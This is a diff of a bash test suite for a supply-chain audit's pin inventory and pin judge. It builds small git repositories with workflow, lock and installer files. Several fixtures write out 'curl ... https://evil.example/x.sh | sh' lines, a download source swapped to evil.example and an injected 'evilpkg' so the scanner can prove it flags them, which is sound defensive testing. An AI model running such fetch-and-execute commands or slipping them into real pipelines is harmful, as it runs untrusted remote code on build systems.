@@ -1,10 +1,12 @@
 #!/usr/bin/env bash
 # proves: REQ-SUP-001-AC18
-# The pin helpers, proved offline. pin-age-check.py keeps the pin judge (is_pin, judge_item, parse_time), its tag and
-# registry lookups and its ruled-text reader; pin-inventory.py reads every pin a pull request can move (action, tool,
-# gotool, package and image items, "<kind>:<name>@<version>") and every form it cannot measure. Each case loads the
-# module it tests and checks it directly, or checks a committed data file (the rulings, the base-inputs list) or the
-# harness-assertion-line parser (harness_form.py, built here), none of it through a command line.
+# The inventory the daily supply-chain audit (pin-audit.py) loads through pin-age-check.py and pin-inventory.py: every version a workflow, script or lock file names is an
+# inventory item, and what the scan cannot read is a placeholder. The pull-request scan that ran these checks on every pull request was deleted on Nov 17 2026
+# (docs/ratify/2026-11-17-cache-pr-checks-six.md); this suite keeps the cases of the functions the daily audit still uses. Each case builds a small git repository and
+# reads it in-process; there are no fixtures.
+#   An item is "<kind>:<name>@<version>"; kinds: action (version = the pinned commit), tool (the installer actions' version inputs and install-scanner.sh's
+#   *_VER pins), gotool (go install path@version in run steps), package (pypi/<name>@<version> from the hash-pinned requirements), image (name@sha256:digest), apk (name@version of a row of build/locks/vm-kernel.lock; the row's sha256 is its sum),
+#   a checksum file is the tool item file:<path>, named by its content.
 set -euo pipefail
 export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@x GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@x   # CI runners have no git identity
 here=$(cd "$(dirname "$0")" && pwd)
@@ -14,57 +16,165 @@ work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
 pass=0 failn=0
 ok()  { pass=$((pass+1)); echo "ok   $1"; }
 bad() { failn=$((failn+1)); echo "FAIL $1"; }
-CASE=""
 check() { if "$@" >/dev/null 2>&1; then ok "$CASE"; else bad "$CASE"; fi; }
+NOW="2026-10-05T12:00:00Z"
+d() { python3 -c "import datetime,sys;print((datetime.datetime(2026,10,5,12)-datetime.timedelta(days=float(sys.argv[1]))).strftime('%Y-%m-%dT%H:%M:%SZ'))" "$1"; }
+SHA1=$(printf '1%.0s' $(seq 40)); SHA2=$(printf '2%.0s' $(seq 40)); SHA3=$(printf '3%.0s' $(seq 40)); SHA4=$(printf '4%.0s' $(seq 40)); SHA5=$(printf '5%.0s' $(seq 40))
+SHA6=$(printf '6%.0s' $(seq 40)); DIG4=sha256:$(printf '4%.0s' $(seq 64)); DIG5=sha256:$(printf '5%.0s' $(seq 64)); DIG1=sha256:$(printf '1%.0s' $(seq 64)); DIG2=sha256:$(printf '2%.0s' $(seq 64)); DIG3=sha256:$(printf '3%.0s' $(seq 64))
 
-# --- the scan reads no time and asks no server: no live or fixture source is left in it
-# ---------------------------------------------------
-CASE="the scan defines none of the time-source names: live proof, observer, PR clock, registry and index times, \
-fixture class, minimum age"
-check python3 - "$chk" <<'PY'
-import importlib.util, sys
-spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-for n in ("live_proofs", "observed", "_pr_clock", "_registry_push", "_go_index_time", "_release_time", "_commit_date",
-          "Fixture", "Live", "MIN_DAYS", "SERVER_SIDE", "tobs", "GO_EXEMPT_REASON"):
-    assert not hasattr(ac, n), n
+# --- the base repository: one of every kind of pin --------------------------------------------------------------------
+base="$work/base"; mkdir -p "$base/.github/workflows" "$base/.github/actions/local" "$base/.github/pins" "$base/bin" "$base/build/docker"
+cat >"$base/.github/workflows/ci.yml" <<EOF
+on: pull_request
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    container:
+      image: ghcr.io/own/ci@$DIG1
+    steps:
+      - uses: actions/checkout@$SHA1 # v4.1.0
+      - uses: golangci/golangci-lint-action@$SHA2 # v9.3.0
+        with:
+          version: v2.13.2
+      - uses: actions/setup-go@$SHA3 # v6.0.0
+        with:
+          go-version: '1.27'
+      - uses: actions/setup-python@$SHA4 # v6.1.0
+        with:
+          python-version: '3.12'
+      - run: |
+          go install github.com/securego/gosec/v2/cmd/gosec@v2.29.0
+          python3 -m pip install --require-hashes -r .github/pins/adjudicator-requirements.txt
+      - uses: goreleaser/goreleaser-action@$SHA6 # v7.2.3
+        with:
+          version: '2.17.1'
+      - uses: helm/kind-action@$SHA6 # v1.15.0
+        with:
+          node_image: kindest/node:v1.31.0@$DIG4
+      - run: |
+          curl -fsSL https://github.com/cli/cli/releases/download/v2.40.0/gh_2.40.0_linux_amd64.tar.gz -o gh.tgz
+          python3 -m pip install --quiet black==24.1.0
+          docker run --rm alpine:3.20@$DIG5 true
+EOF
+cat >"$base/.github/actions/local/action.yml" <<EOF
+name: local
+runs:
+  using: composite
+  steps:
+    - uses: actions/cache@$SHA5 # v4.2.0
+EOF
+cat >"$base/bin/install-scanner.sh" <<'EOF'
+#!/usr/bin/env bash
+TRIVY_VER=0.74.0
+GRYPE_VER=0.118.0
+case "${TOOL}:${arch}" in
+  trivy:x86_64|trivy:amd64) SUM=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ;;
+esac
+EOF
+cat >"$base/.github/pins/adjudicator-requirements.txt" <<'EOF'
+# hash-pinned
+anthropic==1.9.0 \
+    --hash=sha256:aaaa
+requests==2.32.0 \
+    --hash=sha256:bbbb
+EOF
+printf 'FROM gcr.io/distroless/static@%s\n' "$DIG2" >"$base/build/docker/Dockerfile.production"
+printf 'module x\n\ngo 1.27\n\ntoolchain go1.27.1\n\nrequire github.com/foo/bar v1.0.0\n' >"$base/go.mod"
+git -C "$base" init -q; git -C "$base" add -A; git -C "$base" -c user.name=t -c user.email=t@x commit -q -m base
+
+# newcase NAME 'python edit run in the repo root' -> $work/NAME (a copy of base with a head commit)
+newcase() {
+  local n=$1; rm -rf "$work/$n"; cp -R "$base" "$work/$n"
+  ( cd "$work/$n" && python3 - "$2" <<'PY'
+import sys
+exec(sys.argv[1])
 PY
-CASE="parse_time truncates a publication time's fraction like a clock (12:00:00.9 is 12:00:00, not 12:00:01), reads an offset, and gives None for a non-ISO string and a non-string"
-check python3 - "$chk" <<'PY'
-import datetime as dt, importlib.util, sys
-spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-U = dt.timezone.utc
-assert ac.parse_time("2026-10-05T12:00:00.9Z") == dt.datetime(2026, 10, 5, 12, 0, 0, tzinfo=U), ac.parse_time("2026-10-05T12:00:00.9Z")
-assert ac.parse_time("2026-10-05T12:00:00+01:00") == dt.datetime(2026, 10, 5, 11, 0, 0, tzinfo=U)
-assert ac.parse_time("not a time") is None and ac.parse_time(5) is None and ac.parse_time(None) is None
-PY
-CASE="parse_time takes exactly one parameter (the hold-era clock flag is gone): a second argument is a TypeError"
-check python3 - "$chk" <<'PY'
-import importlib.util, inspect, sys
-spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-assert len(inspect.signature(ac.parse_time).parameters) == 1
-try:
-    ac.parse_time("2026-10-05T12:00:00Z", True)
-except TypeError:
-    pass
-else:
-    raise SystemExit("a second argument was accepted")
-PY
+    git add -A; git -c user.name=t -c user.email=t@x commit -q -m head )
+}
+# runck NAME [extra args] -> sets rc, $work/NAME.out
+runck() {
+  local n=$1; shift; rc=0
+  python3 "$chk" --root "$work/$n" --base HEAD~1 --head HEAD --json "$work/$n.json" "$@" >"$work/$n.out" 2>&1 || rc=$?
+}
+sub() { python3 -c "import sys;print('import pathlib; p=pathlib.Path(%r); p.write_text(p.read_text().replace(%r,%r))' % tuple(sys.argv[1:]))" "$@"; }
+OLD=$(d 10); YOUNG=$(d 3)
+
+# --- nothing moves ------------------------------------------------------------------------------------------------------
+newcase none "pathlib=__import__('pathlib'); pathlib.Path('README.md').write_text('hi')"
+runck none
+
+# --- an action pin moves: names it; asks only that it be a pin the scan can read (a commit), never how old it is ---------------------
+NEW1=$(printf 'a%.0s' $(seq 40))
+newcase act "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")"
+runck act
+
+newcase se-three "$(sub .github/workflows/ci.yml "version: v2.13.2" "version: v2.13.3")"; runck se-three
+
+# --- an image on a registry the policy does not name fails (AC3) --------------------------------------------------------------------------
+newcase reg-unknown "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "quay.io/own/ci@$DIG3")"; runck reg-unknown
+newcase reg-dh "$(sub .github/workflows/ci.yml "alpine:3.20@$DIG5" "docker.io/library/alpine:3.20@$DIG3")"; runck reg-dh
+
+NEW5=$(printf 'b%.0s' $(seq 40))
+
+# --- name:tag@sha256:digest counts as PINNED (Docker ignores the tag when a digest is present): the image is the name without the tag, the version the digest ----
+newcase tagdigest "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2@$DIG3")"
+runck tagdigest
+newcase tagonly "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2")"
+runck tagonly
+
+# --- NOT covered: the product's base image, Go modules, the Go toolchain (amendments 1 and 2) -------------------------------------
+newcase notcovered "$(sub build/docker/Dockerfile.production "$DIG2" "$DIG3")
+$(sub go.mod 'go1.27.1' 'go1.27.2')
+$(sub .github/workflows/ci.yml "go-version: '1.27'" "go-version: '1.28'")
+$(sub go.mod 'v1.0.0' 'v1.1.0')"
+runck notcovered
+
+# --- several moves: every one is named, one that is no pin fails the whole check ---------------------------------------------------------
+newcase multi "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
+$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')
+$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' 'requests==2.33.0')
+$(sub .github/workflows/ci.yml 'version: v2.13.2' 'version: v2.13')"
+runck multi
+
+# --- a NEW pin counts as moved; a removed pin is no problem --------------------------------------------------------------
+NEW6=$(printf 'c%.0s' $(seq 40))
+newcase added "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "      - uses: actions/checkout@$SHA1 # v4.1.0"$'\n'"      - uses: actions/upload-artifact@$NEW6 # v7.0.1")"
+runck added
+newcase added-tag "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "      - uses: actions/checkout@$SHA1 # v4.1.0"$'\n'"      - uses: actions/upload-artifact@v7")"
+runck added-tag
+newcase removed "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "")"
+runck removed
+
+# --- an UNCHANGED pin is never judged ----------------------------------------------------------------------------------------------------
+runck none
+
+# --- a workflow whose filename is not ASCII is still read (git quotes such paths; a pin there must never go unjudged) --------------------------------------------
+newcase unicode "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@v4")
+import pathlib, shutil
+shutil.copy('.github/workflows/ci.yml', '.github/workflows/é.yml')
+pathlib.Path('.github/workflows/ci.yml').write_text(pathlib.Path('.github/workflows/ci.yml').read_text().replace('actions/checkout@v4', 'actions/checkout@$SHA1'))"
+runck unicode
+
+# --- plain forms from review round 3: pip extras and operators, an indented requirements line, a tag-only docker run, an expression that holds `|`, an action's subdirectory -----------------------------------
+newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 urllib3>=2.0\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
+runck extras
+newcase subdir "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/init@'$SHA6$' # v3\n      - run: |')"
+git -C "$work/subdir" commit -q --amend -m head
+newcase subdir2 "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/analyze@'$SHA6$' # v3\n      - run: |')"
+runck subdir2
+newcase indentreq "$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' '  requests[security]==2.40.0')"
+runck indentreq
 
 # --- a hostile line cannot stall the readers; the scout versions named in install-scanner.sh; forms this inventory does not measure are listed, never silently empty ---------------------------------
 CASE="inventory: a run line of 200 repeated expressions (a pattern-backtracking probe) is read in well under a second"
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys, time
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
-t = time.time()
+t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
 for body in ("curl https://github.com/a/b/releases/download/v" + "${{ x }}" * 200, "go install example.org/t@" + "${{ x }}" * 200, "pip install foo==" + "${{ x }}" * 200):
     inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + body + "\n"})
-try:
-    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})
-except RuntimeError as e:
-    assert "refusing to read it partially" in str(e)
-else:
-    raise AssertionError("an over-long command line was read as its prefix")
-assert time.time() - t < 3, time.time() - t
+inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})   # a command line is read whole, whatever its length
+assert time.process_time() - t < 3, time.process_time() - t
 PY
 CASE="inventory: docker-scout-X.Y.Z versions in install-scanner.sh's case list are tool:scout items; releases/latest/download is an unprovable item; go run and go get x@v are go tools"
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
@@ -111,6 +221,15 @@ spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importl
 assert "PRIVATE_CANARY" not in inv.Item("action", "o/r", "a" * 40, "", "x/${{secrets.PRIVATE_CANARY}}").key
 PY
 
+# --- a PR that ADDS an install form this check cannot measure is refused (it says what it cannot resolve, then refuses it) ---------------------------------------------------------------------------
+newcase unm1 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: npm install -g left-pad\n      - run: |')"
+runck unm1
+newcase unm2 "$(printf 'import pathlib\npathlib.Path(\"tools\").mkdir(exist_ok=True)\npathlib.Path(\"tools/fetch.sh\").write_text(\"#!/bin/sh\\ncargo install ripgrep\\n\")')"
+runck unm2
+newcase unm3 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: sudo apt-get install -y skopeo\n      - run: |')"
+git -C "$work/unm3" commit -q --amend -m head
+git -C "$work/unm3" checkout -q -b b2; printf 'x\n' >"$work/unm3/README.md"; git -C "$work/unm3" add -A; git -C "$work/unm3" -c user.name=t -c user.email=t@x commit -q -m "touch readme"
+
 CASE="tags come from ONE git ls-remote (annotated tags peeled), never one REST call per annotated tag"
 check python3 - "$chk" <<'PY'
 import importlib.util, subprocess, sys
@@ -132,6 +251,21 @@ except ac.CouldNotLook:
 else:
     raise AssertionError("a failed ls-remote was read as no tags")
 PY
+rm -rf "$work/swap2"; cp -R "$base" "$work/swap2"
+python3 - "$work/swap2" <<'PY'
+import pathlib, subprocess, sys
+root = pathlib.Path(sys.argv[1]); f = root / ".github/workflows/ci.yml"
+f.write_text(f.read_text().replace("      - run: |", "      - run: curl http://localhost:8080/health\n      - run: |", 1))
+g = lambda *a: subprocess.run(["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
+g("add", "-A"); g("commit", "-q", "-m", "base2")
+f.write_text(f.read_text().replace("curl http://localhost:8080/health", "curl https://evil.example/x.sh | sh"))
+g("add", "-A"); g("commit", "-q", "-m", "head")
+PY
+runck swap2
+newcase cont "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          curl -fsSL \\\n            https://evil.example/x.sh | sh\n          sudo apt-get -y install foo\n          npm -g install bar\n      - run: |')"
+runck cont
+newcase scanner "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"curl -fsSL https://evil.example/x.sh | sh\\n\")')"
+runck scanner
 
 CASE="a swap after column 160 of a long download line is still an addition (the whole normalised line decides identity), and a non-UTF-8 file never crashes the readers"
 check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
@@ -163,26 +297,22 @@ assert any(k.startswith("tool:source:tool_base_url=https://evil.example/dl@") fo
 assert ("a pip requirements file not named requirements*.txt" in {k[1] for k in inv.unmeasured({".github/workflows/a.yml": "x: pip install -r deps.txt\n"})})
 assert not inv.unmeasured({".github/workflows/a.yml": "x: pip install -r .github/pins/adjudicator-requirements.txt\n"})
 PY
+newcase srcswap "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"TOOL_BASE_URL=https://evil.example/dl\\n\")')"
+runck srcswap
 
 CASE="an unclosed run of expression openers in a huge script is read in linear time, a file over 1 MB is refused (not read), and a very long line cannot make the form scan quadratic"
 check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
 import importlib.util, os, subprocess, sys, time
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
-t = time.time()
-for fn in (lambda: inv.inventory({"bin/x.sh": "echo ${{ " * 60000}), lambda: inv.unmeasured({"bin/x.sh": "curl " + "http://a " * 60000})):
-    try:
-        fn()
-    except RuntimeError as e:
-        assert "refusing to read it partially" in str(e)     # one enormous line is refused outright, quickly
-assert time.time() - t < 3, time.time() - t
-# a long ordinary pip install with a dependency appended after 4000 characters is REFUSED, never read as its prefix
-pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(400))
-try:
-    inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
-except RuntimeError:
-    pass
-else:
-    raise AssertionError("an overlong pip install was accepted")
+t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
+for fn in (lambda: inv.inventory({"bin/x.sh": ("echo ${{ " * 440 + "\n") * 140}), lambda: inv.unmeasured({"bin/x.sh": ("curl " + "http://a " * 390 + "\n") * 150})):
+    fn()                                                     # many lines just under 4000 characters are read by pattern, quickly
+assert time.process_time() - t < 3, time.process_time() - t
+# a long ordinary pip install just under 4000 characters is read whole: the last dependency is found
+pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(200))
+got = inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
+assert any(k.startswith("package:pypi/evilpkg@9.9.9") for k in got), sorted(got)[-3:]
+assert any(k.startswith("package:pypi/pkg199@1.0.199") for k in got), sorted(got)[-3:]
 repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
 subprocess.run(["git", "init", "-q", repo], check=True)
 open(repo + "/big.sh", "w").write("# x\n" * 300000)
@@ -211,6 +341,36 @@ spec = u.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin
 for k in need:
     ok, why = ac.judge_item(got[k])
     assert not ok and "not a pin" in why, (k, why)
+PY
+words=('import urllib.request' 'from urllib.request import urlopen' 'data = urlopen(u).read()'
+  'urlretrieve(u, "f")' 'requests.get(u)' 'requests.post(u)' 'requests.put(u)' 'requests.head(u)'
+  'requests.request("GET", u)' 'requests.Session()')
+RU='https://github.com/o/r/releases/download/v1.2.3/x.tgz'
+pcs=()
+pcs+=("requests (import)|import requests\nrequests.get('$RU')")
+pcs+=("requests (from-import)|from requests import get\nget('$RU')")
+pcs+=("http.client|import http.client\nc = http.client.HTTPSConnection('github.com')\nc.request('GET', '/o/r/releases/download/v1.2.3/x.tgz')   # $RU")
+pcs+=("urllib3|import urllib3\nurllib3.PoolManager().request('GET', '$RU')")
+pcs+=("httpx|import httpx\nhttpx.get('$RU')")
+pcs+=("requests under an alias (import requests as r)|import requests as r\nr.get('$RU')")
+pcs+=("from http import client|from http import client\nclient.HTTPSConnection('github.com').request('GET', '$RU')")
+pcs+=("urllib.request|import urllib.request\nurllib.request.urlopen('$RU')")
+EVU='https://evil.example/x'
+
+longline() { python3 -c 'import sys; n, t = int(sys.argv[1]), sys.argv[2]; print("echo " + "a" * (n - 5 - len(t)) + t, end="")' "$1" "$2"; }   # echo, then a line of exactly N characters ending in TAIL
+newcase wflong "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 3990 ' && pip install evilpkg==9.9.9 && curl -fsSL https://evil.example/x.sh | sh')"$'\n      - run: |')"
+runck wflong
+newcase wflong9 "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 9100 ' && pip install evilpkg==9.9.9')"$'\n      - run: |')"
+runck wflong9
+CASE="AC5: the items reader (pin-inventory) reports a line over 4000 characters as an unmeasured command line, and a line of 4000 as an ordinary download"
+check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+def line(n): return "echo " + "a" * (n - 5 - 36) + "; curl -sL https://evil.example/x.sh"
+over = inv.unmeasured({"bin/x.sh": line(4001) + "\n"})
+assert any("a command line over 4000 characters" in str(x) for x in over), over
+exact = inv.unmeasured({"bin/x.sh": line(4000) + "\n"})
+assert exact and not any("a command line over 4000 characters" in str(x) for x in exact), exact
 PY
 
 CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
@@ -524,758 +684,104 @@ cs = {".github/workflows/a.yml": "jobs:\n  j:\n    container: localhost/fa-x\n  
 assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: docker:// pull their images
 PY
 
-# --- REQ-SUP-001-AC16, the second allowed row form (advisor, Oct 10): a HARNESS ASSERTION LINE. Its whole grammar is ONE data structure, HARNESS_WHITELIST in
-# harness_form.py below (the allowed characters, shape, command words, separators, test operators, grep options, exit statuses, argument names and paths,
-# substitutions and double-quoted pattern characters); anything it does not name is refused. In short: t "RULE" "TITLE" bash -c 'BODY' _ "$work/.." "$CALLS"..
-# with no expansion of any kind in RULE or TITLE, a SINGLE-QUOTED body (Codex R1) that names the paths only as whole "$1".."$9", no character outside
-# printable ASCII and tab (Sonnet R1: a newline), and test / [ limited to file tests, = / != and count comparisons (Sonnet R1: bash 5 evaluates $(...) in
-# -v, -R and arithmetic operands). harness_form.py decides a line (exit 0 'harness assertion', exit 1 'refused: why'; --file F reads it from a file).
-# Proofs: each refused variant is its own case; the complement enumeration (hf_enum.py) puts every token class outside the whitelist in every position it can
-# take; the mutation run widens the whitelist by one token at a time and requires the enumeration to catch it; the runtime proof executes the corpus under
-# every bash on PATH (5.x and, where present, 3.2) with a marker-writing curl stub, with plain and hostile argument values.
-cat >"$work/harness_form.py" <<'PY'
-import re, sys
-ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-# HARNESS_WHITELIST: the WHOLE grammar of a ruled harness assertion line (REQ-SUP-001-AC16, second row form). Everything not named here is refused.
-HARNESS_WHITELIST = {
-    "line_chars": "".join(chr(c) for c in range(0x20, 0x7F)) + "\t",   # the line holds only these (no newline, CR, control or non-ASCII character)
-    "shape": "t \"RULE\" \"TITLE\" bash -c 'BODY' _ ARG...",          # optional leading spaces; ARG... is zero to nine path arguments
-    "rule_title_chars": ALNUM + " :-.(),=",                            # RULE and TITLE: no expansion of any kind (no $, backtick, backslash, quote)
-    "arg_names": ["work", "CALLS"],                                    # an ARG is "$NAME" or "$NAME/SEG/..." with NAME from this list
-    "arg_path_chars": ALNUM + "_.-",                                   # SEG: one or more of these
-    "max_args": 9,
-    "separators": ["&&", "||", "|", ";"],                              # between the commands of BODY
-    "negation": ["!"],                                                 # may precede a command, or a test expression
-    "commands": ["grep", "test", "[", "cat", "exit"],                  # the command words of BODY, unquoted
-    "pipe_into": ["grep"],                                             # the only command after a |
-    "grep_options": ["-E", "-q", "-v", "-Eq"],                         # grep's options: bare words, before end_of_options
-    "end_of_options": "--",                                            # REQUIRED: grep OPTION... -- PATTERN ["$N"...] and cat -- "$N" (an operand never reads as an option)
-    "pattern_first_char_not": "-",                                     # a double-quoted grep pattern may not start with this
-    "grep_bare_patterns": ["."],                                       # the only unquoted grep pattern
-    "test_unary": ["-f", "-s", "-e", "-d", "-r"],                      # test / [ : OP X
-    "test_string": ["=", "!="],                                        # test / [ : X OP Y
-    "test_count": ["-eq", "-ne", "-lt", "-le", "-gt", "-ge"],          # test / [ : N OP N, N = plain digits or the grep count substitution
-    "exit_status": ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],  # exit takes exactly one of these
-    "positional": "\"$1\" .. \"$9\", whole, at most the number of ARGs", # how BODY names a path: grep's file operands, cat's one operand
-    "substitutions": {"grep": "-c", "cat": ""},                        # "$(grep -c OPTION... -- PATTERN "$N")" (a count) and "$(cat -- "$N")", whole and double-quoted
-    "dquote_chars": ALNUM + " ^.*:/|()=-",                             # inside a double-quoted BODY word (a pattern)
-    "dquote_escapes": ["\\.", "\\[", "\\]"],                         # the only backslash sequences inside a double-quoted BODY word
-}
-# END HARNESS_WHITELIST
-W = HARNESS_WHITELIST
-GSUB, CSUB = "\x01G", "\x01C"                              # placeholders: a character outside line_chars can never come from an accepted line
-class Refused(Exception): pass
-def cls(chars): return "[" + "".join(re.escape(c) for c in chars) + "]"
-DQ = '"(?:' + "|".join([cls(W["dquote_chars"])] + [re.escape(e) for e in W["dquote_escapes"]]) + ')*"'
-PAT = ('"(?!' + re.escape(W["pattern_first_char_not"]) + ')' + DQ[1:]) if W["pattern_first_char_not"] else DQ   # a pattern word: no leading option character
-EOO = (" +" + re.escape(W["end_of_options"])) if W["end_of_options"] else ""
-POS = r'"\$([1-9])"'
-def alt(xs): return "(?:" + "|".join(re.escape(x) for x in sorted(xs, key=len, reverse=True)) + ")"
-SUBS = []
-for cmd, lead in W["substitutions"].items():
-    extra = ("(?: +" + alt(W["grep_options"]) + ")*" + EOO + " +(?:" + alt(W["grep_bare_patterns"]) + "|" + PAT + ")") if cmd == "grep" else EOO
-    SUBS.append((re.compile(r'"\$\(' + re.escape(cmd) + ((" " + re.escape(lead)) if lead else "") + extra + r' "\$([1-9])"\)"'), GSUB if cmd == "grep" else CSUB))
-SHAPE = re.compile(r' *t "(' + cls(W["rule_title_chars"]) + r'*)" "(' + cls(W["rule_title_chars"]) + r'*)" bash -c \'([^\']*)\' _((?: +"[^"]*")*)')
-ARG = re.compile(r'"\$' + alt(W["arg_names"]) + r'(?:/' + cls(W["arg_path_chars"]) + r'+)*"')
-def tokens(body):                                          # [("sep", s)] or [("word", text, kind)]; kind: bare, dq, pos, gsub, csub
-    out, i, n = [], 0, len(body)
-    seps = sorted(W["separators"], key=len, reverse=True)
-    while i < n:
-        if body[i] in " \t": i += 1; continue
-        s = next((s for s in seps if body.startswith(s, i)), None)
-        if s: out.append(("sep", s)); i += len(s); continue
-        j = i
-        while j < n and body[j] not in " \t" and not any(body.startswith(s, j) for s in seps):
-            if body[j] == '"':
-                k = body.find('"', j + 1)
-                if k < 0: raise Refused("an unterminated double quote in the body")
-                j = k + 1
-            else: j += 1
-        w = body[i:j]; i = j
-        if '"' not in w: out.append(("word", w, "bare")); continue
-        if not (len(w) >= 2 and w[0] == '"' and w[-1] == '"' and '"' not in w[1:-1]): raise Refused(f"the word {w!r} mixes quoted and unquoted text")
-        if w == '"' + GSUB + '"': out.append(("word", w, "gsub")); continue
-        if w == '"' + CSUB + '"': out.append(("word", w, "csub")); continue
-        m = re.fullmatch(POS, w)
-        if m: out.append(("word", m.group(1), "pos")); continue
-        if not re.fullmatch(DQ, w): raise Refused(f"the double-quoted word {w!r} holds a character or escape outside dquote_chars / dquote_escapes")
-        out.append(("word", w, "dq"))
-    return out
-def test_expr(args):
-    while args and args[0][2] == "bare" and args[0][1] in W["negation"]: args = args[1:]
-    operand = lambda a: a[2] in ("dq", "pos", "gsub", "csub") or (a[2] == "bare" and re.fullmatch(r"[0-9]+", a[1]))
-    count = lambda a: a[2] == "gsub" or (a[2] == "bare" and re.fullmatch(r"[0-9]+", a[1]))
-    if len(args) == 2 and args[0][2] == "bare" and args[0][1] in W["test_unary"] and args[1][2] == "pos": return   # a file test names a positional "$N" only
-    if len(args) == 3 and args[1][2] == "bare" and args[1][1] in W["test_string"] and operand(args[0]) and operand(args[2]): return
-    if len(args) == 3 and args[1][2] == "bare" and args[1][1] in W["test_count"] and count(args[0]) and count(args[2]): return
-    raise Refused("a test / [ expression outside test_unary (on a positional \"$N\"), test_string and test_count (with their operands)")
-def judge(line):
-    bad = [c for c in line if c not in W["line_chars"]]
-    if bad: raise Refused(f"a character outside the line character set ({bad[0]!r}): bash may read the line differently")
-    m = SHAPE.fullmatch(line)
-    if not m: raise Refused("not the shape t \"RULE\" \"TITLE\" bash -c 'BODY' _ ARG... (or a RULE / TITLE character outside rule_title_chars)")
-    args = re.findall(r' +("[^"]*")', m.group(4))
-    if len(args) > W["max_args"]: raise Refused("more path arguments than max_args")
-    for a in args:
-        if not ARG.fullmatch(a): raise Refused(f"the argument {a} is not \"$NAME\" or \"$NAME/SEG...\" with NAME in arg_names")
-    body = m.group(3)
-    for rx, ph in SUBS:
-        for mm in rx.finditer(body):
-            if int(mm.group(1)) > len(args): raise Refused(f"${mm.group(1)} names no argument")
-        body = rx.sub('"' + ph + '"', body)
-    cmds, cur, seps = [], [], []
-    for t in tokens(body):
-        if t[0] == "sep": cmds.append(cur); seps.append(t[1]); cur = []
-        else: cur.append(t)
-    cmds.append(cur)
